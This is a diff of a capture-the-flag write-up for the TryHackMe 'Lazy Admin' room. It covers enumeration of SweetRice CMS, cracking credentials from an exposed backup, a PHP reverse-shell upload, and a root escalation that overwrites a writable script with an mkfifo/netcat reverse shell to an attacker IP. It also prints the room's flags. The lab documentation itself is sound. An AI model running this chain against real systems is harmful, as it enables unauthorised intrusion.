@@ -9,74 +9,149 @@ date: "2025-05-15"
 # Challenge Setup
 
 ## Tools Used:
-- Nmap — Port scanning and service enumeration.
-- Gobuster — Directory brute-forcing to discover hidden files/folders.
-- CrackStation — Online hash cracking to recover plaintext passwords.
+
+- **Nmap** — Port scanning and service enumeration
+- **Gobuster** — Directory brute-forcing to discover hidden paths
+- **CrackStation** — Online MD5 hash cracking
+- **Netcat** — Reverse shell listener
 
 ## Environment:
 
-TryHackMe hosted VM — Accessed via the provided IP address.
+- TryHackMe hosted VM — Accessed via the provided IP address
+- Kali Linux (attacker machine)
 
 # Initial Recon
-Started the target machine on TryHackMe.
-Ran an nmap service scan and found:
+
+I deployed the machine and ran an Nmap scan:
+
+```
+nmap -sC -sV <target-ip>
+```
+
+Two ports were open:
+
 - Port 22/tcp — OpenSSH
-- Port 80/tcp — HTTP web service
-Visited the site in a browser — a simple default Apache welcome page was displayed. 
-Ran gobuster against the IP and found a directory named /content. Navigated to /content and discovered a page for a CMS called SweetRice.
+- Port 80/tcp — Apache HTTP
 
-# ️Exploitation / Solution
+Visiting the site in a browser showed the default Apache welcome page. I ran Gobuster to enumerate directories:
 
-## 1. Enumerating SweetRice
+```
+gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
 
-Ran gobuster again on /content and discovered 6 different subpaths.
-In /content/images, found a sitemap file — saved for later.
-In /content/as, found files with varying version numbers. The latest file contained a version number 1.5.1.
-Searched online for “SweetRice 1.5.1 exploit” and found several potential vulnerabilities.
-One exploit mentioned backup file disclosure, which could leak credentials.
+This returned a `/content` directory. Navigating to it revealed a **SweetRice CMS** installation page.
 
-## 2. Finding Credentials
+# Exploitation / Solution
 
-The exploit pointed to a backup database file.
-Downloaded it and opened it — found entries for username admin and a hashed password.
-Sent the hash to CrackStation and recovered the password: Password123.
+## Step One — Enumerating SweetRice
 
-## 3. Admin Dashboard Access
+I ran Gobuster again, this time targeting `/content`:
 
-Logged into the SweetRice admin dashboard with admin:Password123.
-Explored the dashboard and found a Media Center upload function.
+```
+gobuster dir -u http://<target-ip>/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
 
-## 4. Gaining a Shell
+This returned several subdirectories. The most useful were:
 
-Crafted a PHP reverse shell and uploaded it via the Media Center.
-Discovered that the CMS allowed multiple file extensions for uploads.
-Triggered the reverse shell by visiting the uploaded file’s URL.
-Connected back to my listener — initial shell obtained.
+- `/content/inc` — contained a `lastest.txt` file confirming the CMS version as **1.5.1**, and a `mysql_backup` folder
+- `/content/as` — the SweetRice admin login panel
 
-## 5. Post-Exploitation & Privilege Escalation
-Enumerated the file system and found a script that referenced another file containing a command to run with elevated privileges.
-Edited the script to execute my own command, saved it, and triggered it.
-This granted me root-level access.
+## Step Two — Finding Credentials
 
-#  Flags
+Inside `/content/inc/mysql_backup/` was a SQL backup file. I downloaded it:
+
+```
+wget http://<target-ip>/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
+```
+
+Inspecting the file revealed a database `INSERT` statement containing the admin credentials:
+
+- **Username:** `manager`
+- **Password hash:** `42f749ade7f9e195bf475f37a44cafcb` (MD5)
+
+I submitted the hash to CrackStation, which cracked it instantly:
+
+**Password:** `Password123`
+
+This is a known exploit for SweetRice 1.5.1 — Backup Disclosure (EDB-ID-40718) — which allows unauthenticated access to the MySQL backup file containing credentials.
+
+## Step Three — Admin Dashboard Access
+
+I navigated to the admin login panel at `/content/as/` and logged in with `manager:Password123`. This granted full access to the SweetRice CMS backend.
+
+## Step Four — Gaining a Shell
+
+Inside the dashboard, the **Media Center** had a file upload function. Direct `.php` uploads were blocked, but the CMS accepted alternative PHP extensions. I uploaded a PHP reverse shell saved as `shell.php5`:
+
+```
+# Shell uploaded to: http://<target-ip>/content/attachment/shell.php5
+```
+
+I started a Netcat listener on my machine:
+
+```
+nc -lvnp 4444
+```
+
+Then triggered the shell by visiting the uploaded file's URL in the browser. A reverse shell connected back as `www-data`.
+
+I navigated to `/home/itguy` and retrieved the user flag from `user.txt`.
+
+## Step Five — Privilege Escalation
+
+I checked what commands `www-data` could run as root:
+
+```
+sudo -l
+```
+
+The output showed:
+
+```
+(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+```
+
+Reading `backup.pl` revealed it simply calls another script:
+
+```perl
+system("sh", "/etc/copy.sh");
+```
+
+Checking `/etc/copy.sh` showed it was a reverse shell script — and critically, it was **world-writable**. I overwrote it with a new reverse shell payload pointing to my machine:
+
+```
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> 5555 >/tmp/f' > /etc/copy.sh
+```
+
+I started a new Netcat listener on port 5555, then triggered the chain:
+
+```
+sudo /usr/bin/perl /home/itguy/backup.pl
+```
+
+`backup.pl` ran as root, called `/etc/copy.sh`, and my listener caught a root shell. I retrieved the root flag from `/root/root.txt`.
+
+# Flags
+
 ```
 User Flag: THM{63e5bce9271952aad1113b6f1ac28a07}
 Root Flag: THM{6637f41d0177b6f37cb20d775124699f}
 ```
 
-#  Tools Used
+# Tools Used
 
-- Nmap — Port scanning and service detection.
-- Gobuster — Directory brute-forcing.
-- CrackStation — Hash cracking.
+- **Nmap** — Port scanning and service detection
+- **Gobuster** — Directory brute-forcing
+- **CrackStation** — MD5 hash cracking
+- **Netcat** — Reverse shell listener
 
-#  Notes / Lessons Learned
-- Always check for CMS version leaks — they often lead to known exploits.
-- Backup files are a goldmine for credentials.
-- Even “basic” upload functions can allow arbitrary code execution if file type checks are weak.
-- Editing scripts that run with elevated privileges is a simple but powerful privilege escalation method.
+# Notes / Lessons Learned
 
-#  Images
+- Always check for CMS version numbers — a specific version often maps directly to known CVEs. SweetRice 1.5.1 has several public exploits including backup disclosure, arbitrary file upload, and CSRF.
+- MySQL backup files in a web-accessible directory are a critical misconfiguration — they can expose plaintext or weakly-hashed credentials.
+- File upload filters based on extension alone are easily bypassed with alternative extensions like `.php5` or `.phtml`, which PHP will still execute.
+- The full privesc chain here required three steps to understand: (1) `sudo -l` reveals a Perl script runnable as root, (2) that script calls a shell script, (3) that shell script is world-writable. Each individual step looks minor; together they give root. Always trace the full call chain.
+
 <img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_1.png" alt="Screenshot 1">
 <img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_2.png" alt="Screenshot 2">
 <img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_3.png" alt="Screenshot 3">
@@ -99,4 +174,3 @@ Root Flag: THM{6637f41d0177b6f37cb20d775124699f}
 <img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_20.png" alt="Screenshot 20">
 <img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_21.png" alt="Screenshot 21">
 <img src="https://raw.githubusercontent.com/KieranPritchard/CTF-Write-Ups/main/TryHackMe/Lazy_Admin/Lazy_Admin_Screenshot_22.png" alt="Screenshot 22">
-
